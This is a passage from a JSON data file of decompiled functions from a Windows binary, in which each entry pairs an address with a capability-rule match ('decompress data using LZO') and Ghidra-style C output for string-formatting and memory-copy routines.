-4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar2) {\n        return uVar3;\n    }\n    fcn.0046bf60(&var_1ch);\n    return uVar3;\n}\n",
        "token_count": 446
    },
    "00460600": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Heritage AFTER dead removal. Example location: s0xffffffe0 : 0x004606dc\n// WARNING: Removing unreachable block (ram,0x00460ac1)\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x00460ce5)\n// WARNING: Removing unreachable block (ram,0x00460771)\n// WARNING: Removing unreachable block (ram,0x00460787)\n// WARNING: Removing unreachable block (ram,0x00460740)\n// WARNING: Removing unreachable block (ram,0x00460792)\n// WARNING: Removing unreachable block (ram,0x00460746)\n// WARNING: Removing unreachable block (ram,0x00460bd3)\n// WARNING: Removing unreachable block (ram,0x00460eb9)\n// WARNING: Removing unreachable block (ram,0x00460f2d)\n// WARNING: Removing unreachable block (ram,0x00460ec3)\n// WARNING: Removing unreachable block (ram,0x00460ecc)\n// WARNING: Removing unreachable block (ram,0x00460f23)\n// WARNING: Removing unreachable block (ram,0x00460ed3)\n// WARNING: Removing unreachable block (ram,0x00460d80)\n// WARNING: Removing unreachable block (ram,0x00460d92)\n// WARNING: Removing unreachable block (ram,0x0046071d)\n// WARNING: Removing unreachable block (ram,0x00460768)\n// WARNING: Removing unreachable block (ram,0x00460caa)\n// WARNING: Removing unreachable block (ram,0x00460ac4)\n// WARNING: Removing unreachable block (ram,0x00460cb3)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl\nfcn.00460600(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, uint arg_20h)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    ulong uVar6;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    uint var_3ah;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_27h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_ch;\n    \n    iVar3 = arg_18h + 0x6c;\n    fcn.004a0ae0(iVar3);\n    iVar3 = fcn.0042e810(iVar3);\n    *NULL = fcn.0046ba90(0, 0, &var_1ch);\n    if (*(iVar3 + 0x10) != '\\0') {\n        fcn.0046d280(0x20);\n    }\n    var_20h = fcn.0046ba90(0, 0, &var_27h + 1);\n    fcn.0046d280(0x20);\n    var_40h = 1;\n    var_1ch = *(iVar3 + 0x38);\n    puVar4 = &var_1ch;\n    while( true ) {\n        if (var_1ch < 5) {\n    // WARNING: Could not recover jumptable at 0x004606f6. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x503194\n            uVar6 = (**(*puVar4 * 4 + 0x503194))();\n            return uVar6;\n        }\n        if (3 < var_40h) break;\n        puVar4 = &var_1ch + var_40h;\n        var_1ch._0_1_ = *puVar4;\n        var_40h = var_40h + 1;\n    }\n    if ((1 < *(var_20h + -0xc)) && (uVar5 = fcn.0042c940(0x30, 0),  uVar5 != 0)) {\n        uVar1 = *(var_20h + -0xc);\n        if (uVar5 == 0xffffffff) {\n            uVar5 = uVar1 - 1;\n        }\n        if (uVar1 < uVar5) {\n            uVar5 = uVar1;\n        }\n        fcn.0046d3b0(0, uVar5, 0);\n    }\n    if (*(stack0xffffffd8 + -0xc) != 0) {\n        fcn.0046d560(0);\n        cVar2 = fcn.0049e880(*(iVar3 + 8), *(iVar3 + 0xc), &var_27h + 3);\n        if (cVar2 == '\\0') {\n            *arg_1ch = *arg_1ch | 4;\n        }\n    }\n    fcn.0046c1d0(&var_20h);\n    cVar2 = fcn.00430e20(&arg_10h);\n    if (cVar2 != '\\0') {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    fcn.0046bf80(&var_27h + 2);\n    fcn.0046bf80(&var_27h + 2);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 1260
    },
    "00460f80": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Heritage AFTER dead removal. Example location: s0xffffffe0 : 0x0046105c\n// WARNING: Removing unreachable block (ram,0x00461441)\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x00461665)\n// WARNING: Removing unreachable block (ram,0x004610f1)\n// WARNING: Removing unreachable block (ram,0x00461107)\n// WARNING: Removing unreachable block (ram,0x004610c0)\n// WARNING: Removing unreachable block (ram,0x00461112)\n// WARNING: Removing unreachable block (ram,0x004610c6)\n// WARNING: Removing unreachable block (ram,0x00461553)\n// WARNING: Removing unreachable block (ram,0x00461839)\n// WARNING: Removing unreachable block (ram,0x004618ad)\n// WARNING: Removing unreachable block (ram,0x00461843)\n// WARNING: Removing unreachable block (ram,0x0046184c)\n// WARNING: Removing unreachable block (ram,0x004618a3)\n// WARNING: Removing unreachable block (ram,0x00461853)\n// WARNING: Removing unreachable block (ram,0x00461700)\n// WARNING: Removing unreachable block (ram,0x00461712)\n// WARNING: Removing unreachable block (ram,0x0046109d)\n// WARNING: Removing unreachable block (ram,0x004610e8)\n// WARNING: Removing unreachable block (ram,0x0046162a)\n// WARNING: Removing unreachable block (ram,0x00461444)\n// WARNING: Removing unreachable block (ram,0x00461633)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl\nfcn.00460f80(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, uint arg_20h)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    ulong uVar6;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    uint var_3ah;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_27h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_ch;\n    \n    iVar3 = arg_18h + 0x6c;\n    fcn.004a0ae0(iVar3);\n    iVar3 = fcn.0042e920(iVar3);\n    *NULL = fcn.0046ba90(0, 0, &var_1ch);\n    if (*(iVar3 + 0x10) != '\\0') {\n        fcn.0046d280(0x20);\n    }\n    var_20h = fcn.0046ba90(0, 0, &var_27h + 1);\n    fcn.0046d280(0x20);\n    var_40h = 1;\n    var_1ch = *(iVar3 + 0x38);\n    puVar4 = &var_1ch;\n    while( true ) {\n        if (var_1ch < 5) {\n    // WARNING: Could not recover jumptable at 0x00461076. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x503180\n            uVar6 = (**(*puVar4 * 4 + 0x503180))();\n            return uVar6;\n        }\n        if (3 < var_40h) break;\n        puVar4 = &var_1ch + var_40h;\n        var_1ch._0_1_ = *puVar4;\n        var_40h = var_40h + 1;\n    }\n    if ((1 < *(var_20h + -0xc)) && (uVar5 = fcn.0042c940(0x30, 0),  uVar5 != 0)) {\n        uVar1 = *(var_20h + -0xc);\n        if (uVar5 == 0xffffffff) {\n            uVar5 = uVar1 - 1;\n        }\n        if (uVar1 < uVar5) {\n            uVar5 = uVar1;\n        }\n        fcn.0046d3b0(0, uVar5, 0);\n    }\n    if (*(stack0xffffffd8 + -0xc) != 0) {\n        fcn.0046d560(0);\n        cVar2 = fcn.0049e880(*(iVar3 + 8), *(iVar3 + 0xc), &var_27h + 3);\n        if (cVar2 == '\\0') {\n            *arg_1ch = *arg_1ch | 4;\n        }\n    }\n    fcn.0046c1d0(&var_20h);\n    cVar2 = fcn.00430e20(&arg_10h);\n    if (cVar2 != '\\0') {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    fcn.0046bf80(&var_27h + 2);\n    fcn.0046bf80(&var_27h + 2);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 1255
    },
    "00461920": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint64_t __cdecl\nfcn.00461920(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch, uint arg_20h, \n            int32_t *arg_24h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_1dh;\n    uint var_bp_ch;\n    \n    piVar2 = fcn.004a0ae0(arg_1ch + 0x6c);\n    *NULL = fcn.0046ba90(0, 0, &var_1dh);\n    if (arg_18h == '\\0') {\n        uVar5 = fcn.00460600(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_1dh + 1);\n    }\n    else {\n        uVar5 = fcn.00460f80(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_1dh + 1);\n    }\n    iVar1 = *(stack0xffffffe0 + -0xc);\n    uVar4 = arg_ch & 0xffff0000 | uVar5 >> 0x20 & 0xffff;\n    if (iVar1 != 0) {\n        fcn.00464ed0(iVar1, 0);\n        iVar3 = *arg_24h;\n        if (-1 < *(iVar3 + -4)) {\n            fcn.00463b40();\n            iVar3 = *arg_24h;\n        }\n        (**(*piVar2 + 0x2c))(stack0xffffffe0, iVar1 + stack0xffffffe0, iVar3);\n    }\n    if (*0x4f59f4 == 0) {\n        iVar1 = *(stack0xffffffe0 + -4);\n        *(stack0xffffffe0 + -4) = iVar1 + -1;\n    }\n    else {\n        LOCK();\n        piVar2 = stack0xffffffe0 + -4;\n        iVar1 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n    }\n    if (0 < iVar1) {\n        return uVar5 & 0xffffffff | uVar4 << 0x20;\n    }\n    fcn.0046bf60(&var_1dh);\n    return uVar5 & 0xffffffff | uVar4 << 0x20;\n}\n",
        "token_count": 631
    },
    "00461aa0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint64_t __cdecl\nfcn.00461aa0(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_bp_ch;\n    \n    var_20h = fcn.0046ba90(0, 0, &var_1ch);\n    if (arg_18h == '\\0') {\n        uVar4 = fcn.00460600(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_20h);\n    }\n    else {\n        uVar4 = fcn.00460f80(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_20h);\n    }\n    uVar3 = arg_ch & 0xffff0000 | uVar4 >> 0x20 & 0xffff;\n    var_1ch = fcn.0048f260();\n    fcn.0049dd30(var_20h, arg_24h, arg_20h, &var_1ch);\n    if (*0x4f59f4 == 0) {\n        iVar2 = *(var_20h + -4);\n        *(var_20h + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_20h + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar2) {\n        return uVar4 & 0xffffffff | uVar3 << 0x20;\n    }\n    fcn.0046bf60(&var_1ch);\n    return uVar4 & 0xffffffff | uVar3 << 0x20;\n}\n",
        "token_count": 522
    },
    "00461c80": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl fcn.00461c80(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t *piVar7;\n    uint *puVar8;\n    int32_t *piVar9;\n    int32_t *piVar10;\n    unkbyte10 in_stack_00000018;\n    uint uStack116;\n    uint *puStack112;\n    uint32_t auStack108 [4];\n    unkbyte10 aStack92 [2];\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint32_t var_34h;\n    int32_t *var_30h;\n    uint var_2ch;\n    uchar var_21h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_bp_ch;\n    \n    var_3ch = arg_10h;\n    var_40h = arg_18h;\n    auStack108[0] = arg_14h + 0x6c;\n    puStack112 = 0x461ca9;\n    fcn.0048f500();\n    puStack112 = &fcn.00461c80::var_20h;\n    uStack116 = 0x461cb7;\n    var_30h = fcn.004a0a80();\n    uStack116 = 0x461cc4;\n    iVar3 = fcn.00418950();\n    iVar3 = -iVar3;\n    piVar7 = &stack0xffffff90 + iVar3;\n    uVar6 = &fcn.00461c80::var_40h + iVar3 + 3 & 0xfffffff0;\n    var_34h = uVar6;\n    *(&stack0xffffff8c + iVar3) = 0x461cd5;\n    var_1ch = fcn.0048f260();\n    *(&stack0xffffffa0 + iVar3) = 0;\n    *(&stack0xffffff9c + iVar3) = 0x502c98;\n    *(&stack0xffffff98 + iVar3) = 0x40;\n    *(&stack0xffffffa4 + iVar3) = in_stack_00000018;\n    *(&stack0xffffff94 + iVar3) = uVar6;\n    *(&stack0xffffff90 + iVar3) = &fcn.00461c80::var_1ch;\n    *(&stack0xffffff8c + iVar3) = 0x461d06;\n    iVar4 = fcn.0049df90();\n    if (0x3f < iVar4) {\n        *(&stack0xffffff8c + iVar3) = 0x461d1e;\n        iVar5 = fcn.00418950();\n        iVar5 = -iVar5;\n        piVar7 = &stack0xffffff90 + iVar5 + iVar3;\n        uVar6 = &fcn.00461c80::var_40h + iVar5 + iVar3 + 3 & 0xfffffff0;\n        var_34h = uVar6;\n        *(&stack0xffffff8c + iVar5 + iVar3) = 0x461d2f;\n        var_1ch = fcn.0048f260();\n        *(&stack0xffffffa0 + iVar5 + iVar3) = 0;\n        *(&stack0xffffff9c + iVar5 + iVar3) = 0x502c98;\n        *(&stack0xffffff98 + iVar5 + iVar3) = iVar4 + 1;\n        *(&stack0xffffffa4 + iVar5 + iVar3) = in_stack_00000018;\n        *(&stack0xffffff94 + iVar5 + iVar3) = uVar6;\n        *(&stack0xffffff90 + iVar5 + iVar3) = &fcn.00461c80::var_1ch;\n        *(&stack0xffffff8c + iVar5 + iVar3) = 0x461d59;\n        iVar4 = fcn.0049df90();\n    }\n    piVar7[1] = 0;\n    piVar7[2] = &stack0xffffffdb;\n    *piVar7 = iVar4;\n    piVar7[-1] = 0x461d74;\n    fcn.0046d8b0();\n    piVar10 = piVar7 + -3;\n    if (-1 < *(var_1ch + -4)) {\n        piVar7[-4] = 0x461e47;\n        fcn.0046ba50();\n    }\n    iVar3 = var_1ch;\n    if (*(var_30h + 7) != '\\x01') {\n        if (*(var_30h + 7) == '\\0') {\n            piVar7[-4] = 0x461e88;\n            fcn.00431cc0();\n            pcVar2 = *(*var_30h + 0x1c);\n            uVar6 = var_34h;\n        }\n        else {\n            pcVar2 = *(*var_30h + 0x1c);\n            uVar6 = var_34h;\n        }\n        var_34h = uVar6;\n        if (pcVar2 != 0x431f40) {\n            piVar7[-1] = iVar3;\n            piVar7[-3] = uVar6;\n            piVar7[-2] = iVar4 + uVar6;\n            piVar9 = piVar7 + -4;\n            piVar7[-4] = 0x461eb0;\n            (*pcVar2)();\n            piVar10 = piVar9 + -0xc;\n            goto code_r0x00461dbe;\n        }\n    }\n    uVar6 = var_34h;\n    piVar7[-1] = iVar4;\n    piVar7[-3] = iVar3;\n    piVar7[-2] = uVar6;\n    piVar7[-4] = 0x461dbe;\n    sub.msvcrt.dll_memcpy();\ncode_r0x00461dbe:\n    piVar10[4] = &fcn.00461c80::var_1ch;\n    piVar10[3] = var_40h;\n    piVar10[1] = arg_ch;\n    piVar10[2] = arg_14h;\n    *piVar10 = arg_8h;\n    if (var_3ch == '\\0') {\n        piVar10[-1] = 0x461e35;\n        _var_30h = fcn.00461ef0(*piVar10, piVar10[1], piVar10[2], piVar10[3], piVar10[4]);\n    }\n    else {\n        piVar10[-1] = 0x461dec;\n        _var_30h = fcn.00462530(*piVar10, piVar10[1], piVar10[2], piVar10[3], piVar10[4]);\n    }\n    if (*0x4f59f4 == 0) {\n        iVar3 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_1ch + -4;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    puVar8 = piVar10 + -5;\n    if (iVar3 < 1) {\n        var_30h = _var_30h;\n        piVar10[-5] = &stack0xffffffdb;\n        var_2ch = _var_30h >> 0x20;\n        piVar10[-6] = 0x461e72;\n        fcn.0046bf60();\n        puVar8 = piVar10 + -6;\n    }\n    var_30h = _var_30h;\n    var_2ch = _var_30h >> 0x20;\n    puVar8[-1] = 0x461e17;\n    fcn.0048f620();\n    return _var_30h;\n}\n",
        "token_count": 1866
    },
    "00461ef0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nulong __cdecl fcn.00461ef0(int32_t *arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h, uint8_t **arg_18h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint8_t *puVar6;\n    int32_t *piVar7;\n    uint8_t *puVar8;\n    uint32_t uVar9;\n    bool bVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    uint8_t *puVar13;\n    uint *puVar14;\n    uint uVar15;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    char *var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint32_t var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    uint8_t var_35h;\n    uint32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar var_26h;\n    uchar var_25h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_ch;\n    \n    var_34h = arg_ch;\n    var_35h = arg_ch;\n    iVar4 = fcn.004a0a80(arg_10h + 0x6c);\n    iVar5 = fcn.00432500();\n    piVar7 = *(*(arg_10h + 0x6c) + 0xc) + iVar5 * 4;\n    iVar11 = *piVar7;\n    if (iVar11 == 0) {\n        puVar14 = fcn.004a3500(0x44);\n        *puVar14 = 0x50af14;\n        *(puVar14 + 4) = 0;\n        puVar14[1] = 0;\n        puVar14[2] = 0;\n        puVar14[3] = 0;\n        *(puVar14 + 0x12) = 0;\n        puVar14[5] = 0;\n        puVar14[6] = 0;\n        puVar14[7] = 0;\n        puVar14[8] = 0;\n        puVar14[9] = 0;\n        puVar14[10] = 0;\n        puVar14[0xb] = 0;\n        puVar14[0xc] = 0;\n        puVar14[0xd] = 0;\n        *(puVar14 + 0x43) = 0;\n        fcn.0048a350(arg_10h + 0x6c);\n        fcn.0048da50(puVar14, iVar5);\n        iVar11 = *piVar7;\n    }\n    puVar13 = *arg_18h;\n    piVar7 = puVar13 + -0xc;\n    if (*puVar13 == *(iVar11 + 0x38)) {\n        var_1ch = *(iVar11 + 0x34);\n        if (*piVar7 == 0) goto code_r0x00461fa6;\n        var_50h = *(iVar11 + 0x24);\n        puVar13 = puVar13 + 1;\n        var_44h = *(iVar11 + 0x28);\n    }\n    else {\n        var_1ch = *(iVar11 + 0x30);\n        var_50h = *(iVar11 + 0x1c);\n        var_44h = *(iVar11 + 0x20);\n    }\n    puVar8 = puVar13 + *piVar7;\n    if ((puVar13 < puVar8) && (puVar6 = puVar13,  (*(*(iVar4 + 0x18) + *puVar13 * 2) & 8) != 0)) {\n        do {\n            puVar6 = puVar6 + 1;\n            if (puVar8 == puVar6) {\n                iVar4 = puVar8 - puVar13;\n                goto joined_r0x00461fd6;\n            }\n        } while ((*(*(iVar4 + 0x18) + *puVar6 * 2) & 8) != 0);\n        iVar4 = puVar6 - puVar13;\njoined_r0x00461fd6:\n        if (iVar4 != 0) {\n            var_24h = fcn.0046ba90(0, 0, &var_20h);\n            fcn.0046d280(iVar4 * 2);\n            iVar5 = *(iVar11 + 0x2c);\n            var_40h = iVar4 - iVar5;\n            if (0 < var_40h) {\n                if (iVar5 < 0) {\n                    var_40h = iVar4;\n                }\n                if (*(iVar11 + 0xc) == 0) {\n                    fcn.0046c6f0(puVar13, var_40h);\n                    iVar5 = *(iVar11 + 0x2c);\n                }\n                else {\n                    fcn.0046bde0(0, *(var_24h + -0xc), var_40h * 2, 0);\n                    uVar15 = *(iVar11 + 0xc);\n                    uVar2 = *(iVar11 + 8);\n                    cVar1 = *(iVar11 + 0x12);\n                    if (-1 < *(var_24h + -4)) {\n                        fcn.0046ba50();\n                    }\n                    iVar5 = fcn.0049d950(var_24h, cVar1, uVar2, uVar15, puVar13, puVar13 + var_40h);\n                    if (-1 < *(var_24h + -4)) {\n                        fcn.0046ba50();\n                    }\n                    uVar9 = iVar5 - var_24h;\n                    uVar12 = *(var_24h + -0xc);\n                    if (uVar12 < uVar9) {\n                        uVar15 = 0x502c24;\n                        piVar7 = fcn.0049f220(0x502c38, 0x502c24);\n                        fcn.0046bf80(&var_25h, uVar15, uVar9, uVar12);\n                        fcn.0046bf80(&var_25h);\n                        uVar15 = fcn.0041b360(piVar7);\n                        fcn.004a36d0(uVar15);\n                        (**(*piVar7 + 4))();\n                        do {\n                            uVar15 = fcn.004a3b60();\n                            fcn.004a36d0(uVar15);\n                        } while( true );\n                    }\n                    fcn.0046d3b0(uVar9, uVar12 - uVar9, 0);\n                    iVar5 = *(iVar11 + 0x2c);\n                }\n            }\n            if (0 < iVar5) {\n                fcn.0046d560(*(iVar11 + 0x11));\n                if (var_40h < 0) {\n                    fcn.0046c5d0(-var_40h, *(iVar11 + 0x39));\n                    fcn.0046c3b0(puVar13, iVar4);\n                }\n                else {\n                    fcn.0046c3b0(puVar13 + var_40h, *(iVar11 + 0x2c));\n                }\n            }\n            uVar9 = var_44h + *(var_24h + -0xc);\n            uVar12 = *(arg_10h + 0xc) & 0xb0;\n            if ((*(arg_10h + 0xc) & 0x200) != 0) {\n                uVar9 = uVar9 + *(iVar11 + 0x18);\n            }\n            var_20h = fcn.0046ba90(0, 0, &var_26h);\n            fcn.0046d280(uVar9 * 2);\n            uVar3 = *(arg_10h + 8);\n            puVar14 = &var_1ch;\n            bVar10 = uVar12 == 0x10 && uVar9 < uVar3;\n            do {\n                if (*puVar14 < 5) {\n    // switch table (5 cases) at 0x502c84\n                    switch(*puVar14) {\n                    case 0:\n                        if (bVar10) {\ncode_r0x004621fd:\n                            fcn.0046c5d0(uVar3 - uVar9, arg_14h);\n                        }\n                        break;\n                    case 1:\n                        if (bVar10) goto code_r0x004621fd;\n                        fcn.0046d560(arg_14h);\n                        break;\n                    case 2:\n                        if ((*(arg_10h + 0xd) & 2) != 0) {\n                            fcn.0046c3b0(*(iVar11 + 0x14), *(iVar11 + 0x18));\n                        }\n                        break;\n                    case 3:\n                        if (var_44h != 0) {\n                            fcn.0046d560(*var_50h);\n                        }\n                        break;\n                    case 4:\n                        fcn.0046c470(&var_24h);\n                    }\n                }\n                puVar14 = puVar14 + 1;\n            } while (puVar14 != &var_18h);\n            if (var_44h < 2) {\n                uVar9 = *(var_20h + -0xc);\n            }\n            else {\n                fcn.0046c3b0(var_50h + 1, var_44h - 1);\n                uVar9 = *(var_20h + -0xc);\n            }\n            if (uVar9 < uVar3) {\n                if (uVar12 == 0x20) {\n                    fcn.0046c5d0(uVar3 - uVar9, arg_14h);\n                    uVar9 = uVar3;\n                }\n                else {\n                    fcn.0046bde0(0, 0, uVar3 - uVar9, arg_14h);\n                    uVar9 = uVar3;\n                }\n            }\n            if (var_35h == 0) {\n                uVar12 = (**(*arg_8h + 0x30))(var_20h, uVar9);\n                var_35h = uVar12 != uVar9;\n            }\n            var_34h = arg_ch & 0xffffff00;\n            fcn.0046bf80(&var_25h);\n            fcn.0046bf80(&var_25h);\n        }\n    }\ncode_r0x00461fa6:\n    *(arg_10h + 8) = 0;\n    var_34h = var_34h & 0xffffff00 | var_35h;\n    return CONCAT44(var_34h, arg_8h);\n}\n",
        "token_count": 2492
    },
    "00462530": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nulong __cdecl fcn.00462530(int32_t *arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h, uint8_t **arg_18h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint8_t *puVar6;\n    int32_t *piVar7;\n    uint8_t *puVar8;\n    uint32_t uVar9;\n    bool bVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    uint8_t *puVar13;\n    uint *puVar14;\n    uint uVar15;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    char *var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint32_t var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    uint8_t var_35h;\n    uint32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar var_26h;\n    uchar var_25h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_ch;\n    \n    var_34h = arg_ch;\n    var_35h = arg_ch;\n    iVar4 = fcn.004a0a80(arg_10h + 0x6c);\n    iVar5 = fcn.00432500();\n    piVar7 = *(*(arg_10h + 0x6c) + 0xc) + iVar5 * 4;\n    iVar11 = *piVar7;\n    if (iVar11 == 0) {\n        puVar14 = fcn.004a3500(0x44);\n        *puVar14 = 0x50af24;\n        *(puVar14 + 4) = 0;\n        puVar14[1] = 0;\n        puVar14[2] = 0;\n        puVar14[3] = 0;\n        *(puVar14 + 0x12) = 0;\n        puVar14[5] = 0;\n        puVar14[6] = 0;\n        puVar14[7] = 0;\n        puVar14[8] = 0;\n        puVar14[9] = 0;\n        puVar14[10] = 0;\n        puVar14[0xb] = 0;\n        puVar14[0xc] = 0;\n        puVar14[0xd] = 0;\n        *(puVar14 + 0x43) = 0;\n        fcn.0048aa30(arg_10h + 0x6c);\n        fcn.0048da50(puVar14, iVar5);\n        iVar11 = *piVar7;\n    }\n    puVar13 = *arg_18h;\n    piVar7 = puVar13 + -0xc;\n    if (*puVar13 == *(iVar11 + 0x38)) {\n        var_1ch = *(iVar11 + 0x34);\n        if (*piVar7 == 0) goto code_r0x004625e6;\n        var_50h = *(iVar11 + 0x24);\n        puVar13 = puVar13 + 1;\n        var_44h = *(iVar11 + 0x28);\n    }\n    else {\n        var_1ch = *(iVar11 + 0x30);\n        var_50h = *(iVar11 + 0x1c);\n        var_44h = *(iVar11 + 0x20);\n    }\n    puVar8 = puVar13 + *piVar7;\n    if ((puVar13 < puVar8) && (puVar6 = puVar13,  (*(*(iVar4 + 0x18) + *puVar13 * 2) & 8) != 0)) {\n        do {\n            puVar6 = puVar6 + 1;\n            if (puVar8 == puVar6) {\n                iVar4 = puVar8 - puVar13;\n                goto joined_r0x00462616;\n            }\n        } while ((*(*(iVar4 + 0x18) + *puVar6 * 2) & 8) != 0);\n        iVar4 = puVar6 - puVar13;\njoined_r0x00462616:\n        if (iVar4 != 0) {\n            var_24h = fcn.0046ba90(0, 0, &var_20h);\n            fcn.0046d280(iVar4 * 2);\n            iVar5 = *(iVar11 + 0x2c);\n            var_40h = iVar4 - iVar5;\n            if (0 < var_40h) {\n                if (iVar5 < 0) {\n                    var_40h = iVar4;\n                }\n                if (*(iVar11 + 0xc) == 0) {\n                    fcn.0046c6f0(puVar13, var_40h);\n                    iVar5 = *(iVar11 + 0x2c);\n                }\n                else {\n                    fcn.0046bde0(0, *(var_24h + -0xc), var_40h * 2, 0);\n                    uVar15 = *(iVar11 + 0xc);\n                    uVar2 = *(iVar11 + 8);\n                    cVar1 = *(iVar11 + 0x12);\n                    if (-1 < *(var_24h + -4)) {\n                        fcn.0046ba50();\n                    }\n                    iVar5 = fcn.0049d950(var_24h, cVar1, uVar2, uVar15, puVar13, puVar13 + var_40h);\n                    if (-1 < *(var_24h + -4)) {\n                        fcn.0046ba50();\n                    }\n                    uVar9 = iVar5 - var_24h;\n                    uVar12 = *(var_24h + -0xc);\n                    if (uVar12 < uVar9) {\n                        uVar15 = 0x502c24;\n                        piVar7 = fcn.0049f220(0x502c38, 0x502c24);\n                        fcn.0046bf80(&var_25h, uVar15, uVar9, uVar12);\n                        fcn.0046bf80(&var_25h);\n                        uVar15 = fcn.0041b360(piVar7);\n                        fcn.004a36d0(uVar15);\n                        (**(*piVar7 + 4))();\n                        do {\n                            uVar15 = fcn.004a3b60();\n                            fcn.004a36d0(uVar15);\n                        } while( true );\n                    }\n                    fcn.0046d3b0(uVar9, uVar12 - uVar9, 0);\n                    iVar5 = *(iVar11 + 0x2c);\n                }\n            }\n            if (0 < iVar5) {\n                fcn.0046d560(*(iVar11 + 0x11));\n                if (var_40h < 0) {\n                    fcn.0046c5d0(-var_40h, *(iVar11 + 